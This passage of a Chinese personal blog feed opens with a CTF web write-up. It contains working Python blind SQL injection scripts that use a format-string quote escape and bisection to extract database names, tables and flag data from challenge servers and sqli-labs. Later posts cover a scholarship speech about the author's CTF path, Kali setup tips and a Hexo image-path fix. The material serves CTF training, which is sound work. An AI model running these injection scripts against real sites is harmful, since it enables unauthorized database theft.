spellcheck="true"># config-start</span>sleep_time <span class="token operator">=</span> <span class="token number">5</span>error_time <span class="token operator">=</span> <span class="token number">1</span><span class="token comment" spellcheck="true"># config-end</span><span class="token keyword">def</span> <span class="token function">getPayload</span><span class="token punctuation">(</span>indexOfResult<span class="token punctuation">,</span> indexOfChar<span class="token punctuation">,</span> mid<span class="token punctuation">)</span><span class="token punctuation">:</span>    column_name<span class="token operator">=</span><span class="token string">"column_name"</span>    table_name<span class="token operator">=</span><span class="token string">"columns"</span>    database_name<span class="token operator">=</span><span class="token string">"information_schema"</span>    startStr <span class="token operator">=</span> <span class="token string">"admin%1$\\' or "</span>    endStr <span class="token operator">=</span> <span class="token string">" #"</span>    payload <span class="token operator">=</span> <span class="token string">"((ascii(substring((select "</span> <span class="token operator">+</span> column_name <span class="token operator">+</span> <span class="token string">" from "</span> <span class="token operator">+</span> database_name <span class="token operator">+</span> <span class="token string">"."</span> <span class="token operator">+</span> table_name <span class="token operator">+</span> <span class="token string">" where table_name=0x666c6167 limit "</span> <span class="token operator">+</span> indexOfResult <span class="token operator">+</span> <span class="token string">",1 ),"</span> <span class="token operator">+</span> indexOfChar <span class="token operator">+</span> <span class="token string">",1)))>"</span> <span class="token operator">+</span> mid <span class="token operator">+</span> <span class="token string">")"</span>    payload <span class="token operator">=</span> startStr <span class="token operator">+</span> payload <span class="token operator">+</span> endStr    <span class="token keyword">return</span> payload<span class="token keyword">def</span> <span class="token function">exce</span><span class="token punctuation">(</span>indexOfResult<span class="token punctuation">,</span>indexOfChar<span class="token punctuation">,</span>mid<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment" spellcheck="true"># content-start</span>    url <span class="token operator">=</span> <span class="token string">"http://3ce3bb7f26364585b8d7970ae179fe54857ddd7277964f32.changame.ichunqiu.com/"</span>    post_data<span class="token operator">=</span><span class="token punctuation">{</span><span class="token string">"username"</span><span class="token punctuation">:</span>getPayload<span class="token punctuation">(</span>indexOfResult<span class="token punctuation">,</span>indexOfChar<span class="token punctuation">,</span>mid<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token string">"password"</span><span class="token punctuation">:</span><span class="token string">"123"</span><span class="token punctuation">}</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>post_data<span class="token punctuation">)</span>    content <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span>data<span class="token operator">=</span>post_data<span class="token punctuation">)</span>    content<span class="token punctuation">.</span>encoding<span class="token operator">=</span><span class="token string">'utf-8'</span>    content<span class="token operator">=</span>content<span class="token punctuation">.</span>text    <span class="token comment" spellcheck="true">#print(content)</span>    <span class="token comment" spellcheck="true"># content-end</span>    <span class="token comment" spellcheck="true"># judge-start</span>    <span class="token keyword">if</span> <span class="token string">"password error!"</span> <span class="token keyword">in</span> content<span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token boolean">True</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token boolean">False</span>    <span class="token comment" spellcheck="true"># judge-end</span><span class="token keyword">def</span> <span class="token function">exceGet</span><span class="token punctuation">(</span>indexOfResult<span class="token punctuation">,</span>indexOfChar<span class="token punctuation">,</span>mid<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment" spellcheck="true"># content-start</span>    url <span class="token operator">=</span> <span class="token string">"http://localhost/sqli-labs-master/Less-5/?id="</span>    tempurl <span class="token operator">=</span> url <span class="token operator">+</span> getPayload<span class="token punctuation">(</span>indexOfResult<span class="token punctuation">,</span>indexOfChar<span class="token punctuation">,</span>mid<span class="token punctuation">)</span>    content <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>tempurl<span class="token punctuation">)</span><span class="token punctuation">.</span>text    <span class="token comment" spellcheck="true"># content-end</span>    <span class="token comment" spellcheck="true"># judge-start</span>    <span class="token keyword">if</span> <span class="token string">"You are in..........."</span> <span class="token keyword">in</span> content<span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token boolean">True</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token boolean">False</span>    <span class="token comment" spellcheck="true"># judge-end</span><span class="token keyword">def</span> <span class="token function">doubleSearch</span><span class="token punctuation">(</span>indexOfResult<span class="token punctuation">,</span>indexOfChar<span class="token punctuation">,</span>left_number<span class="token punctuation">,</span> right_number<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">while</span> left_number <span class="token operator">&lt;</span> right_number<span class="token punctuation">:</span>        mid <span class="token operator">=</span> int<span class="token punctuation">(</span><span class="token punctuation">(</span>left_number <span class="token operator">+</span> right_number<span class="token punctuation">)</span> <span class="token operator">/</span> <span class="token number">2</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> exce<span class="token punctuation">(</span>str<span class="token punctuation">(</span>indexOfResult<span class="token punctuation">)</span><span class="token punctuation">,</span>str<span class="token punctuation">(</span>indexOfChar <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span>str<span class="token punctuation">(</span>mid<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            left_number <span class="token operator">=</span> mid        <span class="token keyword">else</span><span class="token punctuation">:</span>            right_number <span class="token operator">=</span> mid        <span class="token keyword">if</span> left_number <span class="token operator">==</span> right_number <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">:</span>            <span class="token keyword">if</span> exce<span class="token punctuation">(</span>str<span class="token punctuation">(</span>indexOfResult<span class="token punctuation">)</span><span class="token punctuation">,</span>str<span class="token punctuation">(</span>indexOfChar <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span>str<span class="token punctuation">(</span>mid<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                mid <span class="token operator">+=</span> <span class="token number">1</span>                <span class="token keyword">break</span>            <span class="token keyword">else</span><span class="token punctuation">:</span>                <span class="token keyword">break</span>    <span class="token keyword">return</span> chr<span class="token punctuation">(</span>mid<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">search</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">32</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token comment" spellcheck="true"># 需要遍历的查询结果的数量</span>        counter <span class="token operator">=</span> <span class="token number">0</span>        <span class="token keyword">for</span> j <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">32</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token comment" spellcheck="true"># 结果的长度</span>            counter <span class="token operator">+=</span> <span class="token number">1</span>            temp <span class="token operator">=</span> doubleSearch<span class="token punctuation">(</span>i<span class="token punctuation">,</span> j<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">127</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># 从255开始查询</span>            <span class="token keyword">if</span> ord<span class="token punctuation">(</span>temp<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">:</span> <span class="token comment" spellcheck="true"># 当为1的时候说明已经查询结束</span>                <span class="token keyword">break</span>            sys<span class="token punctuation">.</span>stdout<span class="token punctuation">.</span>write<span class="token punctuation">(</span>temp<span class="token punctuation">)</span>            sys<span class="token punctuation">.</span>stdout<span class="token punctuation">.</span>flush<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> counter <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">:</span> <span class="token comment" spellcheck="true"># 当结果集的所有行都被遍历后退出</span>            <span class="token keyword">break</span>        sys<span class="token punctuation">.</span>stdout<span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token string">"\r\n"</span><span class="token punctuation">)</span>        sys<span class="token punctuation">.</span>stdout<span class="token punctuation">.</span>flush<span class="token punctuation">(</span><span class="token punctuation">)</span>search<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p>获得库ctf</p><pre class=" language-python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">getPayload</span><span class="token punctuation">(</span>indexOfResult<span class="token punctuation">,</span> indexOfChar<span class="token punctuation">,</span> mid<span class="token punctuation">)</span><span class="token punctuation">:</span>    column_name<span class="token operator">=</span><span class="token string">"schema_name"</span>    table_name<span class="token operator">=</span><span class="token string">"schemata"</span>    database_name<span class="token operator">=</span><span class="token string">"information_schema"</span>    startStr <span class="token operator">=</span> <span class="token string">"admin%1$\\' or "</span>    endStr <span class="token operator">=</span> <span class="token string">" #"</span>    payload <span class="token operator">=</span> <span class="token string">"((ascii(substring((select "</span> <span class="token operator">+</span> column_name <span class="token operator">+</span> <span class="token string">" from "</span> <span class="token operator">+</span> database_name <span class="token operator">+</span> <span class="token string">"."</span> <span class="token operator">+</span> table_name <span class="token operator">+</span> <span class="token string">"  limit "</span> <span class="token operator">+</span> indexOfResult <span class="token operator">+</span> <span class="token string">",1),"</span> <span class="token operator">+</span> indexOfChar <span class="token operator">+</span> <span class="token string">",1)))>"</span> <span class="token operator">+</span> mid <span class="token operator">+</span> <span class="token string">")"</span>    payload <span class="token operator">=</span> startStr <span class="token operator">+</span> payload <span class="token operator">+</span> endStr    <span class="token keyword">return</span> payload</code></pre><p>获得表名flag</p><pre class=" language-python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">getPayload</span><span class="token punctuation">(</span>indexOfResult<span class="token punctuation">,</span> indexOfChar<span class="token punctuation">,</span> mid<span class="token punctuation">)</span><span class="token punctuation">:</span>    column_name<span class="token operator">=</span><span class="token string">"table_name"</span>    table_name<span class="token operator">=</span><span class="token string">"tables"</span>    database_name<span class="token operator">=</span><span class="token string">"information_schema"</span>    startStr <span class="token operator">=</span> <span class="token string">"admin%1$\\' or "</span>    endStr <span class="token operator">=</span> <span class="token string">" #"</span>    payload <span class="token operator">=</span> <span class="token string">"((ascii(substring((select "</span> <span class="token operator">+</span> column_name <span class="token operator">+</span> <span class="token string">" from "</span> <span class="token operator">+</span> database_name <span class="token operator">+</span> <span class="token string">"."</span> <span class="token operator">+</span> table_name <span class="token operator">+</span> <span class="token string">" where table_schema=database()  limit "</span> <span class="token operator">+</span> indexOfResult <span class="token operator">+</span> <span class="token string">",1 ),"</span> <span class="token operator">+</span> indexOfChar <span class="token operator">+</span> <span class="token string">",1)))>"</span> <span class="token operator">+</span> mid <span class="token operator">+</span> <span class="token string">")"</span>    payload <span class="token operator">=</span> startStr <span class="token operator">+</span> payload <span class="token operator">+</span> endStr    <span class="token keyword">return</span> payload</code></pre><p>获得字段flag</p><pre class=" language-python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">getPayload</span><span class="token punctuation">(</span>indexOfResult<span class="token punctuation">,</span> indexOfChar<span class="token punctuation">,</span> mid<span class="token punctuation">)</span><span class="token punctuation">:</span>    column_name<span class="token operator">=</span><span class="token string">"table_name"</span>    table_name<span class="token operator">=</span><span class="token string">"tables"</span>    database_name<span class="token operator">=</span><span class="token string">"information_schema"</span>    startStr <span class="token operator">=</span> <span class="token string">"admin%1$\\' or "</span>    endStr <span class="token operator">=</span> <span class="token string">" #"</span>    payload <span class="token operator">=</span> <span class="token string">"((ascii(substring((select "</span> <span class="token operator">+</span> column_name <span class="token operator">+</span> <span class="token string">" from "</span> <span class="token operator">+</span> database_name <span class="token operator">+</span> <span class="token string">"."</span> <span class="token operator">+</span> table_name <span class="token operator">+</span> <span class="token string">" where table_name = 0x666c6167 limit "</span> <span class="token operator">+</span> indexOfResult <span class="token operator">+</span> <span class="token string">",1 ),"</span> <span class="token operator">+</span> indexOfChar <span class="token operator">+</span> <span class="token string">",1)))>"</span> <span class="token operator">+</span> mid <span class="token operator">+</span> <span class="token string">")"</span>    payload <span class="token operator">=</span> startStr <span class="token operator">+</span> payload <span class="token operator">+</span> endStr    <span class="token keyword">return</span> payload</code></pre><p>获得数据</p><pre class=" language-python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">getPayload</span><span class="token punctuation">(</span>indexOfResult<span class="token punctuation">,</span> indexOfChar<span class="token punctuation">,</span> mid<span class="token punctuation">)</span><span class="token punctuation">:</span>    column_name<span class="token operator">=</span><span class="token string">"flag"</span>    table_name<span class="token operator">=</span><span class="token string">"columns"</span>    database_name<span class="token operator">=</span><span class="token string">"flag"</span>    startStr <span class="token operator">=</span> <span class="token string">"admin%1$\\' or "</span>    endStr <span class="token operator">=</span> <span class="token string">" #"</span>    payload <span class="token operator">=</span> <span class="token string">"((ascii(substring((select "</span> <span class="token operator">+</span> column_name <span class="token operator">+</span> <span class="token string">" from "</span> <span class="token operator">+</span> database_name <span class="token operator">+</span> <span class="token string">" limit "</span> <span class="token operator">+</span> indexOfResult <span class="token operator">+</span> <span class="token string">",1 ),"</span> <span class="token operator">+</span> indexOfChar <span class="token operator">+</span> <span class="token string">",1)))>"</span> <span class="token operator">+</span> mid <span class="token operator">+</span> <span class="token string">")"</span>    payload <span class="token operator">=</span> startStr <span class="token operator">+</span> payload <span class="token operator">+</span> endStr    <span class="token keyword">return</span> payload</code></pre><h3 id="花式盲注ciscn-2019-web-northern-china-day2-web1"><a href="#花式盲注ciscn-2019-web-northern-china-day2-web1" class="headerlink" title="花式盲注ciscn_2019_web_northern_china_day2_web1"></a>花式盲注ciscn_2019_web_northern_china_day2_web1</h3><pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> time<span class="token keyword">import</span> requestsurl <span class="token operator">=</span> <span class="token string">'http://7ccdf96a-66d5-4601-a1f0-4a3cba45893c.node3.buuoj.cn/index.php'</span>flag <span class="token operator">=</span> <span class="token string">''</span><span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">32</span><span class="token punctuation">,</span><span class="token number">50</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment" spellcheck="true">#从33到126为可打印的字符</span>    low <span class="token operator">=</span> <span class="token number">33</span>    height <span class="token operator">=</span> <span class="token number">126</span>    data <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">'id'</span><span class="token punctuation">:</span><span class="token string">''</span><span class="token punctuation">}</span>    <span class="token keyword">while</span> low <span class="token operator">&lt;=</span> height <span class="token punctuation">:</span>        mid <span class="token operator">=</span> <span class="token punctuation">(</span>low <span class="token operator">+</span> height<span class="token punctuation">)</span> <span class="token operator">//</span> <span class="token number">2</span>        data<span class="token punctuation">[</span><span class="token string">'id'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'if(ascii(substr((select(flag)from(flag)),%d,1))>%d,1,2)'</span><span class="token operator">%</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span>mid<span class="token punctuation">)</span>        html <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span>data<span class="token punctuation">)</span><span class="token punctuation">.</span>text        time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> <span class="token string">'Hello'</span> <span class="token keyword">in</span> html <span class="token punctuation">:</span>            low <span class="token operator">=</span> mid <span class="token operator">+</span> <span class="token number">1</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token comment" spellcheck="true">#将小于和等于的情况一起考虑，所以在low~mid中间寻找</span>            height <span class="token operator">=</span> mid        <span class="token comment" spellcheck="true">#出现low = height = mid，若不判断会进入死循环</span>        <span class="token keyword">if</span> height <span class="token operator">==</span> mid <span class="token operator">==</span> low<span class="token punctuation">:</span>            <span class="token keyword">break</span>    flag <span class="token operator">+=</span> chr<span class="token punctuation">(</span>int<span class="token punctuation">(</span>mid<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span></code></pre>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> sql </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>记2019年11月园丁励志奖学金校答辩</title>
      <link href="/2019/11/19/ji-2019-nian-11-yue-yuan-ding-li-zhi-jiang-xue-jin-xiao-da-bian/"/>
      <url>/2019/11/19/ji-2019-nian-11-yue-yuan-ding-li-zhi-jiang-xue-jin-xiao-da-bian/</url>
      
        <content type="html"><![CDATA[<h3 id="因为感觉自己上台的机会蛮多的，就完全脱稿了，不过还好也没翻车"><a href="#因为感觉自己上台的机会蛮多的，就完全脱稿了，不过还好也没翻车" class="headerlink" title="因为感觉自己上台的机会蛮多的，就完全脱稿了，不过还好也没翻车"></a>因为感觉自己上台的机会蛮多的，就完全脱稿了，不过还好也没翻车</h3><p>不过呢，我心里比较郁闷的是感觉自己有点违心了，说了一些我不喜欢说的话，但是老师们喜欢的，不过还好答辩结束后一个小姐姐回了我一句，很不错很有个性<br>我觉得在台上，还是脱稿好一些，因为观众也不知道你想说什么，如果不脱稿会太在意稿子，完全就是对着稿子念了</p><h3 id="刘导、大一杨导给我改ppt幸苦了"><a href="#刘导、大一杨导给我改ppt幸苦了" class="headerlink" title="刘导、大一杨导给我改ppt幸苦了"></a>刘导、大一杨导给我改ppt幸苦了</h3><p>在正式答辩前，在导员办公室还专门排练了一次</p><div class="row">    <embed src="./1.pdf" width="100%" height="550" type="application/pdf"></div><h3 id="稿子改来改去也就变成了这个样子-虽然有点违心，但是不得不说，导员还是导员，改了改还是挺新颖的"><a href="#稿子改来改去也就变成了这个样子-虽然有点违心，但是不得不说，导员还是导员，改了改还是挺新颖的" class="headerlink" title="稿子改来改去也就变成了这个样子,虽然有点违心，但是不得不说，导员还是导员，改了改还是挺新颖的"></a>稿子改来改去也就变成了这个样子,虽然有点违心，但是不得不说，导员还是导员，改了改还是挺新颖的</h3><hr><h4 id="1、开头自我介绍-以及开场"><a href="#1、开头自我介绍-以及开场" class="headerlink" title="1、开头自我介绍/以及开场"></a>1、开头自我介绍/以及开场</h4><p>各位老师，同学们大家好，我是计算机学院软件工程卓越班的刘志赞。准备答辩时想了很久，我到底分享些什么呢？正犯愁的时候看到了桌面上的小旗子，灵光一闪，不如我就讲讲我和这面旗子的故事，在信息安全竞赛中每写出一道题目都会获得一面这样的小旗子，所以也被称为CTF（capture the flag），这面旗是我ctf生涯中的第一面旗，今天我就来讲一下我的C T F</p><h4 id="2、介绍自己的背景"><a href="#2、介绍自己的背景" class="headerlink" title="2、介绍自己的背景"></a>2、介绍自己的背景</h4><p>我的家乡在江西抚州，均为先天性残疾的父母和同时抚养两个小孩的经济负担导致我的家庭并不富裕，因此上大学前从未深入接触过计算机，我带着少年的好奇走出大山、但是进入大学的第一天，好奇少年就开始慌了，宿舍大佬们，CPU、显卡、内存条、php，开机，于是找导员，0基础的我该怎样追上其他同学<br>导员和我说，“放心去学，他们所谓的基础根本不算基础，只要你认真学，很快就能赶回来”，这句话给我带来了满满的信心！<br>有了信心，那接下来就是怎么做的问题了。</p><h4 id="3、Click表示豁然开朗，为什么敲响CTF的大门"><a href="#3、Click表示豁然开朗，为什么敲响CTF的大门" class="headerlink" title="3、Click表示豁然开朗，为什么敲响CTF的大门"></a>3、Click表示豁然开朗，为什么敲响CTF的大门</h4><p>学校课程是我计算机知识体系的基石，但如果要想掌握更多技能，唯一的方法就是拿出时间和耐心自学。于是在宿舍时我阅读了大量计算机方向经典著作，积极参加技术培训，撰写学习博客多达十万字。<br>就这样，我一步步学会了基础的开发技能，也因此接到了我的第一个项目——开发一套英文版教务系统。但在工作中我并没有获得预想的对软件开发激情，我时常思考，我真的喜欢软件开发吗？在编写系统中关于学生信息安全部分的时候，我惊喜发现自己对信息安全的敏感和对网络安全的热爱，于是在项目完成后，我几乎将所有空余时间投入到网络安全的学习中。</p><h4 id="4、Touch到CTF的一些故事"><a href="#4、Touch到CTF的一些故事" class="headerlink" title="4、Touch到CTF的一些故事"></a>4、Touch到CTF的一些故事</h4><p>纸上得来终觉浅，我选择了信息安全竞赛磨练自己的实战能力。，小旗的故事便从第一次CTF校赛开始。但是那时的我只写出了一个最简单的签到题。<br>但我并没有因此而气馁，我将这面代表着我起点的旗子放在桌前，提醒自己不忘初心，继续参加各类信息安全比赛。从校赛二十七名到省赛参与奖，再从省赛二等奖到国赛三等奖，然后国赛二等奖，全国一等奖，每次都前进一点，而这面旗也一直陪伴着我。<br>现在的我已经从一个0基础的萌新蜕变成了南航信息安全战队的队长，这面旗也一直放在我宿舍的书桌上，激励着我不忘初心，奋力前行。<br>当然竞赛的道路并不是一帆风顺，在今年的上半年我们没打赢过一场比赛，加上队员丧到想退出战队，我也曾怀疑过自己是否真的适合ctf。回到宿舍，看着桌面上的这面旗，他提醒着我如果现在放弃，之前的努力将白费，办法总比困难多。于是我调整心态，激励队员们总结失败的原因，潜心学习、训练，咬牙继续坚持。终于在之后的几个月、我们南征备战，斩获多个省奖，国奖。而我竞赛之旅印象最为深刻的一场比赛就在8月。<br>今年暑假，我和2位队员参加了蓝帽杯全国CTF大赛。在北京国家会议中心我们从十四万参赛学生手中夺得全国第八名（一等奖），中国人民公安大学校长亲自颁奖，我也是我第一次将校旗带到国赛一等奖的颁奖舞台。当拿着奖杯站在领奖台上的时候，我的心情非常激动，我知道我终于对得起自己熬过的夜晚，对得起和战队兄弟们日夜训练的日子，之前所付出的辛苦是值得的！<br>在获得国奖后，我们受邀前往国家大数据安全靶场参加了全国网络空间安全精英集训营，在那里我们针对国家政府机构的网站进行漏洞排查，维护国家安全，看着靶场上“聚天下英才，卫国家安全”的标语，无比自豪能为国家贡献自己的绵薄之力！这场比赛也更加坚定了我想要进行网络安全学习与研究的决心！</p><h4 id="5、Future回报社会"><a href="#5、Future回报社会" class="headerlink" title="5、Future回报社会"></a>5、Future回报社会</h4><p>上大学的两年来，除了自身的努力外，一路上也获得了很多老师同学们的帮助。我很感谢也很感恩，因此我也在尽一己之长去传递这份正能量。<br>为了让更多的人熟悉、入门网络安全，同时担任信息安全战队队长以及南航信息化技术中心网络部部长的我，从开学至今，坚持每周一次以上面向全校同学开展网络安全技术培训。同时为了让同学们有一个更好的实践环境，我和队员们也自费搭建了信息安全竞赛平台，目前已有一百二十多位同学进入学习，在这里也欢迎更多的同学加入我们。（ppt丢一个网址和群二维码）</p><h4 id="6、结尾"><a href="#6、结尾" class="headerlink" title="6、结尾"></a>6、结尾</h4><p>暑假《亲爱的热爱的》电视剧大火，让更多的人认识了CTF，但是真正的CTF赛场没有电竞椅聚光灯观众席，它拥有的是更加热血的极客精神，”Know it, then Hack it!”，了解它，并且征服它<br>在计算机学院我click了我的计算机之路，在南航我touch了我的CTF之梦，在Future,我将保持对计算机的执着，坚守着对网络安全的初心<br>我是刘志赞，一名想成为CTF世界冠军的追梦者</p><hr><p>算是一个美好的经历吧，确实上台没大一那么慌了，算成长了</p><p><img src="2.jpg" alt="img"></p><p><img src="3.jpg" alt="img"></p><h3 id="嘤嘤嘤姜师傅的海报不错"><a href="#嘤嘤嘤姜师傅的海报不错" class="headerlink" title="嘤嘤嘤姜师傅的海报不错"></a>嘤嘤嘤姜师傅的海报不错</h3><p><img src="4.jpg" alt="img"></p>]]></content>
      
      
      <categories>
          
          <category> 世间温柔 </category>
          
          <category> 咪咪 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 有咪咪 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Kali的一些坑</title>
      <link href="/2019/11/19/kali-de-yi-xie-keng/"/>
      <url>/2019/11/19/kali-de-yi-xie-keng/</url>
      
        <content type="html"><![CDATA[<h3 id="一、安装Kali双系统的坑"><a href="#一、安装Kali双系统的坑" class="headerlink" title="一、安装Kali双系统的坑"></a>一、安装Kali双系统的坑</h3><p>不知道有没有人安装kali双系统的时候遇到这个<br><code>从光盘上读取数据出错，请确认光盘已被放置在驱动器中，如果重试以后开始无法工作，请检查光盘完整性，无法从光盘上拷贝文件，要重试吗</code>,重试就在这里了，不重试只能退出</p><p><img src="1.jpg" alt="img"></p><h4 id="问题所在"><a href="#问题所在" class="headerlink" title="问题所在"></a>问题所在</h4><p>使用软碟通烧启动盘的时候写入方式为RAW能解决！！亲测</p><p><img src="2.jpg" alt="img"></p><h3 id="二、Kali虚拟机安装后黑屏打不开"><a href="#二、Kali虚拟机安装后黑屏打不开" class="headerlink" title="二、Kali虚拟机安装后黑屏打不开"></a>二、Kali虚拟机安装后黑屏打不开</h3><p>emm，然后虚拟机有炸了，果然还是要看看教程，自己闯就有很多问题<br>主要的问题是下面的2个选择，我默认回车了，然后GG</p><h4 id="切记：都选是！！虽然默认是否"><a href="#切记：都选是！！虽然默认是否" class="headerlink" title="切记：都选是！！虽然默认是否"></a>切记：都选是！！虽然默认是否</h4><p><img src="4.jpg" alt="img"></p><p><img src="3.jpg" alt="img"></p><h3 id="三、Kali换源和虚拟机装了vm还不能复制文件？"><a href="#三、Kali换源和虚拟机装了vm还不能复制文件？" class="headerlink" title="三、Kali换源和虚拟机装了vm还不能复制文件？"></a>三、Kali换源和虚拟机装了vm还不能复制文件？</h3><p>我也很无奈鸭，装了vmtools也不行复制粘贴,<br>1.编辑源</p><pre><code>vi /etc/apt/sources.list</code></pre><p>2.新增如下源</p><pre><code>deb http://mirrors.tuna.tsinghua.edu.cn/kali kali-rolling main contrib non-freedeb-src https://mirrors.tuna.tsinghua.edu.cn/kali kali-rolling main contrib non-freedeb http://mirrors.zju.edu.cn/kali kali-rolling main contrib non-free deb-src http://mirrors.zju.edu.cn/kali kali-rolling main contrib non-freedeb http://mirrors.aliyun.com/kali kali main non-free contrib deb-src http://mirrors.aliyun.com/kali kali main non-free contrib deb http://mirrors.aliyun.com/kali-security kali/updates main contrib non-free</code></pre><p>3.按照官方文档。</p><pre><code>apt-get updateapt-get install open-vm-tools-desktop fusereboot</code></pre><p>4.有一说一，确实有效</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>hexo-matery与hexo-asset-image冲突问题</title>
      <link href="/2019/11/19/hexo-matery-yu-hexo-asset-image-chong-tu-wen-ti/"/>
      <url>/2019/11/19/hexo-matery-yu-hexo-asset-image-chong-tu-wen-ti/</url>
      
        <content type="html"><![CDATA[<h3 id="今天写博客的时候突然发生一件非常恶心的事情"><a href="#今天写博客的时候突然发生一件非常恶心的事情" class="headerlink" title="今天写博客的时候突然发生一件非常恶心的事情"></a>今天写博客的时候突然发生一件非常恶心的事情</h3><p>我个人用的是matery主题，然后图片用了<code>hexo-asset-image</code>插件<br>一般来说流程是</p><ol><li>配置_config.yml里面的post_asset_folder:false这个选项设置为true。</li><li>安装hexo-asset-image，运行hexo n “xxxx”来生成md博文时，/source/_posts文件夹内除了xxxx.md文件还有一个同名的文件夹，把图片放入该文件夹。</li><li>使用<code>![](xxx.png)</code>直接插入图片即可。</li></ol><p>可真实情况是</p><p><img src="2.png" alt="img"></p><p>生成图片的链接居然都变成了</p><pre><code>/.io//1.png</code></pre><p><img src="4.jpg" alt="img"></p><p>重新hexo-clean,hexo-g也是一样的如下，太惨了</p><p><img src="1.png" alt="img"></p><h3 id="寻找解决办法"><a href="#寻找解决办法" class="headerlink" title="寻找解决办法"></a>寻找解决办法</h3><p>网上说原因是:</p><p>由于hexo3版本后对很多插件支持有问题，hexo-asset-image插件在处理data.permalink链接时出现路径错误，把年月去掉了，导致最后生成的路径为%d/xxx/xxx需要对其做兼容处理。通过判断当前版本是否等于3的版本做不同的路径分割。<br>反正和matery主题冲突了-我专门用了一个干净的环境也是一样的。</p><h4 id="网上说改hexo-asset-image中的源码"><a href="#网上说改hexo-asset-image中的源码" class="headerlink" title="网上说改hexo-asset-image中的源码"></a>网上说改hexo-asset-image中的源码</h4><p>改来改去确一直不生效，你说气不气</p><p><img src="5.jpg" alt="img"></p><h3 id="我的办法"><a href="#我的办法" class="headerlink" title="我的办法"></a>我的办法</h3><p><del>这个插件中暑了，不如我们</del>嗯嗯，卸载这个插件<br><code>npm uninstall hexo-asset-image</code><br>看看会发生啥<br>其实总的来说是正常的，只是url重复了，比如<br>我在markdown中写<code>![](hexo-matery与hexo-asset-image冲突问题/5.jpg)</code><br>生成的url是<code>/hexo-matery与hexo-asset-image冲突问题/hexo-matery与hexo-asset-image冲突问题/5.jpg</code><br>!!!!居然重复了一遍<br>纠结怎么改插件，不如把所有的<code>![]({文件夹名}/x.jpg)</code>改成<code>![](x.jpg)</code>，虽然预览很恶心，但是hexo生成后没问题</p><h3 id="写脚本"><a href="#写脚本" class="headerlink" title="写脚本"></a>写脚本</h3><p>emm，终于觉得没白学python,一般我自己之前写了2中插入图片的语法，一种是<code>![]({文件夹名}/x.jpg)</code>,一种是<code>src=&quot;{文件夹啊名}/xx.jpg&quot;</code>，所以通用脚本这样的</p><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true"># -- coding:utf-8 </span><span class="token keyword">import</span> os<span class="token keyword">import</span> re<span class="token comment" spellcheck="true">#filePath='C:/Users/38138/Desktop/1'</span>filePath<span class="token operator">=</span><span class="token string">'C:/blog/source/_posts'</span>count<span class="token operator">=</span><span class="token number">1</span><span class="token keyword">for</span> file <span class="token keyword">in</span> os<span class="token punctuation">.</span>listdir<span class="token punctuation">(</span>filePath<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment" spellcheck="true">#title=file[0:-3]</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>file<span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token 